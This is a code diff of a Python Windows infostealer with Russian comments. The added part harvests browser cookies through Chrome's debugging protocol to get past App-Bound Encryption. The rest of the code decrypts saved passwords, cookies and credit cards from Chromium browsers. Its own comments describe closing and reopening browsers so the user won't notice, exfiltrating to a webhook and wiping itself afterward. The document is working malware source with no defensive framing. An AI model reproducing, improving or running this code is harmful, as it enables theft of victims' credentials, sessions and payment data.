@@ -1,10 +1,11 @@
-# Python 3.10+, Win10/11, зависимость: requests
-# st.py — hybrid stealer (Chromium/Firefox/Discord/wallet + sysinfo)
-# close_browsers -> steal -> reopen -> exfil -> self-wipe
+# Python 3.10+, Win10/11, зависимости: requests pycryptodome websocket-client
 import os, sys, json, base64, shutil, sqlite3, glob, re, zipfile
 import tempfile, subprocess, time, ctypes, platform, socket
+import urllib.request
 from ctypes import wintypes
 from pathlib import Path
+from Crypto.Cipher import AES
+import websocket
 
 WEBHOOK = sys.argv[1] if len(sys.argv) > 1 else ""
 TAG     = (os.environ.get("COMPUTERNAME", "host") + "_" + str(int(time.time()))).replace(" ", "_")
@@ -16,7 +17,7 @@ def safe(fn, *a, **k):
     except Exception: return None
 
 # ============================================================
-# DPAPI через ctypes (вместо pywin32)
+# DPAPI через ctypes (crypt32.dll)
 # ============================================================
 class DATA_BLOB(ctypes.Structure):
     _fields_ = [("cbData", wintypes.DWORD),
@@ -31,9 +32,9 @@ def dpapi_dec(data: bytes):
         buf = ctypes.create_string_buffer(data, len(data))
         bin_ = DATA_BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
         bout = DATA_BLOB()
-        ok = crypt32.CryptUnprotectData(
-            ctypes.byref(bin_), None, None, None, None, 0, ctypes.byref(bout))
-        if not ok: return None
+        if not crypt32.CryptUnprotectData(
+                ctypes.byref(bin_), None, None, None, None, 0, ctypes.byref(bout)):
+            return None
         out = ctypes.string_at(bout.pbData, bout.cbData)
         kernel32.LocalFree(bout.pbData)
         return out
@@ -41,63 +42,14 @@ def dpapi_dec(data: bytes):
         return None
 
 # ============================================================
-# AES-256-GCM через bcrypt.dll (вместо pycryptodome)
+# AES-GCM через pycryptodome (для v10/v11)
 # ============================================================
-bcrypt = ctypes.windll.bcrypt
-
-class BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(ctypes.Structure):
-    _fields_ = [
-        ("cbSize",            wintypes.ULONG),
-        ("dwInfoVersion",     wintypes.ULONG),
-        ("pbNonce",           ctypes.POINTER(ctypes.c_ubyte)),
-        ("cbNonce",           wintypes.ULONG),
-        ("pbAuthData",        ctypes.POINTER(ctypes.c_ubyte)),
-        ("cbAuthData",        wintypes.ULONG),
-        ("pbTag",             ctypes.POINTER(ctypes.c_ubyte)),
-        ("cbTag",             wintypes.ULONG),
-        ("pbMacContext",      ctypes.POINTER(ctypes.c_ubyte)),
-        ("cbMacContext",      wintypes.ULONG),
-        ("cbAAD",             wintypes.ULONG),
-        ("cbData",            ctypes.c_ulonglong),
-        ("dwFlags",           wintypes.ULONG),
-    ]
-
-def _bcrypt_open():
-    hAlg = ctypes.c_void_p()
-    if bcrypt.BCryptOpenAlgorithmProvider(
-            ctypes.byref(hAlg), ctypes.c_wchar_p("AES"), None, 0) != 0:
-        return None
-    return hAlg
-
 def aes_gcm_decrypt(key: bytes, nonce: bytes, ct: bytes, tag: bytes):
-    hAlg = _bcrypt_open()
-    if not hAlg: return None
-    hKey = ctypes.c_void_p()
     try:
-        if bcrypt.BCryptGenerateSymmetricKey(
-                ctypes.byref(hKey), hAlg, None, 0,
-                ctypes.c_char_p(key), len(key), 0) != 0:
-            return None
-        nonce_buf = (ctypes.c_ubyte * len(nonce)).from_buffer_copy(nonce)
-        tag_buf   = (ctypes.c_ubyte * len(tag)).from_buffer_copy(tag)
-        ct_buf    = ctypes.create_string_buffer(ct, len(ct))
-        out_buf   = ctypes.create_string_buffer(len(ct))
-        info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
-        info.cbSize        = ctypes.sizeof(info)
-        info.dwInfoVersion = 1
-        info.pbNonce       = nonce_buf
-        info.cbNonce       = len(nonce)
-        info.pbTag         = tag_buf
-        info.cbTag         = len(tag)
-        written = wintypes.ULONG(0)
-        st = bcrypt.BCryptDecrypt(
-            hKey, ct_buf, len(ct), ctypes.byref(info),
-            None, 0, out_buf, len(ct), ctypes.byref(written), 0)
-        if st != 0: return None
-        return out_buf.raw[:written.value]
-    finally:
-        if hKey: bcrypt.BCryptDestroyKey(hKey)
-        bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(ct, tag)
+    except Exception:
+        return None
 
 def chrome_key(local_state: Path):
     try:
@@ -120,7 +72,7 @@ def chrome_decrypt(blob: bytes, key):
         return None
 
 # ============================================================
-# copy_shared — CreateFileW с FILE_SHARE_READ, потом SHARE_READ|WRITE
+# copy_shared — CreateFileW, SHARE_READ потом SHARE_READ|WRITE
 # ============================================================
 _GEN_READ   = 0x80000000
 _OPEN_EXIST = 3
@@ -139,7 +91,6 @@ _ReadFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD,
 _CloseHandle = _k32.CloseHandle
 
 def copy_shared(src: Path, dst: Path) -> bool:
-    """Копирует залоченный файл: SHARE_READ, потом SHARE_READ|WRITE."""
     for share in (_SHARE_READ, _SHARE_RW):
         h = _CreateFileW(str(src), _GEN_READ, share, None, _OPEN_EXIST, 0, None)
         if h == wintypes.HANDLE(-1).value:
@@ -160,10 +111,80 @@ def copy_shared(src: Path, dst: Path) -> bool:
     return False
 
 # ============================================================
-# close/reopen browsers
+# Chrome DevTools Protocol (обход v20 App-Bound Encryption)
+# ============================================================
+def steal_cookies_cdp(browser_name, port):
+    if browser_name == "Chrome":
+        paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+                 r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
+    elif browser_name == "Edge":
+        paths = [r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+                 r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"]
+    elif browser_name == "Brave":
+        paths = [r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"]
+    else:
+        return False
+
+    exe_path = next((p for p in paths if os.path.exists(p)), None)
+    if not exe_path: return False
+    exe_name = os.path.basename(exe_path)
+
+    # 1. Убиваем браузер
+    subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True, timeout=10)
+    time.sleep(2)
+
+    # 2. Запускаем с отладкой
+    try:
+        subprocess.Popen([exe_path, f"--remote-debugging-port={port}", "--headless=new"],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        return False
+
+    # 3. Ждём CDP
+    ws_url = None
+    for _ in range(15):
+        try:
+            resp = urllib.request.urlopen(f"http://127.0.0.1:{port}/json/version", timeout=2)
+            ws_url = json.loads(resp.read())["webSocketDebuggerUrl"]
+            break
+        except Exception:
+            time.sleep(1)
+
+    if not ws_url:
+        subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True)
+        return False
+
+    # 4. Подключаемся и запрашиваем куки
+    cookies = []
+    try:
+        ws = websocket.create_connection(ws_url, timeout=10)
+        ws.send(json.dumps({"id": 1, "method": "Storage.getCookies", "params": {}}))
+        result = json.loads(ws.recv())
+        cookies = result.get("result", {}).get("cookies", [])
+        ws.close()
+    except Exception:
+        pass
+
+    # 5. Убиваем браузер (оставляем мертвым для steal_chromium)
+    subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True, timeout=10)
+    time.sleep(1)
+
+    # 6. Сохраняем
+    if cookies:
+        with (OUT / f"{browser_name}_CDP_cookies.txt").open("w", encoding="utf-8") as f:
+            for c in cookies:
+                domain = c.get("domain", "")
+                name = c.get("name", "")
+                value = c.get("value", "")
+                path = c.get("path", "/")
+                f.write(f"{domain}\t{name}\t{value}\t{path}\n")
+        return True
+    return False
+
+# ============================================================
+# Close/Reopen browsers
 # ============================================================
 _BROWSER_EXES = ("chrome.exe", "msedge.exe", "brave.exe", "browser.exe", "opera.exe")
-
 _BROWSER_PATHS = [
     r"C:\Program Files\Google\Chrome\Application\chrome.exe",
     r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
@@ -173,26 +194,21 @@ _BROWSER_PATHS = [
 ]
 
 def close_browsers():
-    """Graceful close, чтобы отпустили Cookies/Login Data."""
     for exe in _BROWSER_EXES:
-        safe(subprocess.run, ["taskkill", "/IM", exe],
-             capture_output=True, timeout=10)
+        safe(subprocess.run, ["taskkill", "/IM", exe], capture_output=True, timeout=10)
     time.sleep(4)
     for exe in _BROWSER_EXES:
-        safe(subprocess.run, ["taskkill", "/IM", exe, "/F"],
-             capture_output=True, timeout=5)
+        safe(subprocess.run, ["taskkill", "/IM", exe, "/F"], capture_output=True, timeout=5)
     time.sleep(2)
 
 def reopen_browsers():
-    """Вернуть браузеры — юзер не заметит."""
     for p in _BROWSER_PATHS:
         if os.path.exists(p):
-            safe(subprocess.Popen, [p],
-                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(1)  # не все сразу
+            safe(subprocess.Popen, [p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(1)
 
 # ============================================================
-# Chromium
+# Chromium (пароли, карты, старые куки)
 # ============================================================
 CHROMIUM = {
     "Chrome":  Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data",
@@ -220,8 +236,7 @@ def _chromium_item(prof: Path, rel: str, suffix: str, tag: str, key):
                 with (OUT / f"{tag}_logins.txt").open("w", encoding="utf-8") as f:
                     for url, user, pw in rows:
                         dec = chrome_decrypt(pw, key)
-                        if dec:
-                            f.write(f"{url}\t{user}\t{dec}\n")
+                        if dec: f.write(f"{url}\t{user}\t{dec}\n")
         elif suffix == "cookies":
             rows = list(con.execute(
                 "SELECT host_key, name, encrypted_value, path FROM cookies"))
@@ -229,12 +244,10 @@ def _chromium_item(prof: Path, rel: str, suffix: str, tag: str, key):
                 with (OUT / f"{tag}_cookies.txt").open("w", encoding="utf-8") as f:
                     for host, cn, enc, path in rows:
                         dec = chrome_decrypt(enc, key)
-                        if dec:
-                            f.write(f"{host}\t{cn}\t{dec}\t{path}\n")
+                        if dec: f.write(f"{host}\t{cn}\t{dec}\t{path}\n")
         elif suffix == "cards":
             rows = list(con.execute(
-                "SELECT card_number_encrypted, "
-                "expiration_month||'/'||expiration_year, name_on_card FROM credit_cards"))
+                "SELECT card_number_encrypted, expiration_month||'/'||expiration_year, name_on_card FROM credit_cards"))
             if rows:
                 with (OUT / f"{tag}_cards.txt").open("w", encoding="utf-8") as f:
                     for num, exp, nm in rows:
@@ -435,6 +448,12 @@ def self_clean():
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
     safe(close_browsers)
+    
+    # CDP для Chrome и Edge (обход v20)
+    safe(steal_cookies_cdp, "Chrome", 9222)
+    safe(steal_cookies_cdp, "Edge", 9223)
+    
+    # Пароли и карты (браузеры мертвы, локов нет)
     for n, ud in CHROMIUM.items():
         safe(steal_chromium, n, ud)
     safe(steal_firefox)
